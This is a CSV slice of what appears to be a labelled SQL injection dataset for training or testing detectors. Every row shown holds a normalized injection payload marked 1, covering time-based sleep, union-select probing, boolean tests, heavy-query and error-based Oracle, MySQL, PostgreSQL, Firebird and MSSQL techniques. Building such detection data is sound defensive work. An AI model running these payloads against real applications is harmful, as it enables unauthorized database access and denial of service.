row_index,payload_norm,label,sqli_type_hint
7890,1%' ) rlike sleep ( 5 ) and ( '%' = ',1,
7891,"1 ) where 7748 = 7748 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
7892,"-9171 ) union all select 6880,6880,6880,6880,6880,6880,6880#",1,
7893,-1772' or 7911 = 4985#,1,
7894,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'zjxk' = 'zjxk",1,
7895,"1' ) where 9091 = 9091 union all select null,null,null,null#",1,
7896,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,1,
7897,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",1,
7898,"1' and make_set ( 4952 = 7129,7129 )",1,
7899,1 ) and 3861 = 5813--,1,
7900,1 ) as afxc where 7497 = 7497,1,
7901,1' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
7902,-1711 ) where 9098 = 9098 order by 1#,1,
7903,1' in boolean mode ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) #,1,
7904,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,
7905,1' ) where 2928 = 2928 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
7906,"1 ) as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
7907,"-2582'+ ( select ggim where 5346 = 5346 union all select 5346,5346#",1,
7908,"1 ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
7909,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'crkz' = 'crkz",1,
7910,"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
7911,"-6381%"" or 8571 = 8571--",1,
7912,1' ) as jlae where 1650 = 1650,1,
7913,"1' where 2774 = 2774 union all select null,null,null,null,null#",1,
7914,"1%"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""%"" = """,1,
7915,1 where 7038 = 7038,1,
7916,1'+ ( select basp where 6953 = 6953,1,
7917,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'eqle' = 'eqle",1,
7918,-8486%' ) ) ) or 8571 = 8571--,1,
7919,"-3393"" ) ) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1,
